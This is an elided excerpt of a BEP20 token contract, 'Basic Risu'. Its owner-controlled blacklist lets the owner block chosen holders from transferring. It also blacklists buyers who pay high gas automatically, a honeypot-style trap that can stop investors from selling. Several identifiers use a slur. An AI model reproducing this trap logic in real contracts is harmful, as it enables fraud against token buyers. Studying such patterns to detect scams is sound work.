...
contract BasicRisu is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "Basic Risu";
    ...
    bool public retardMode = true;
    mapping (address => bool) public isretard;
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        marketingFeeReceiver = 0xd299fAefA9AEeD68168E18d870Bc0e6a7D37cA47;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(retardMode){
            require(!isretard[sender],"retard");    
        }
        
        if (tx.gasprice >= AS1 && recipient != pair) {
            isretard[recipient] = true;
    ...
    function enableretard(bool _status) public onlyOwner {
        retardMode = _status;
    }
    ...
    function manageretard(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isretard[addresses[i]] = status;
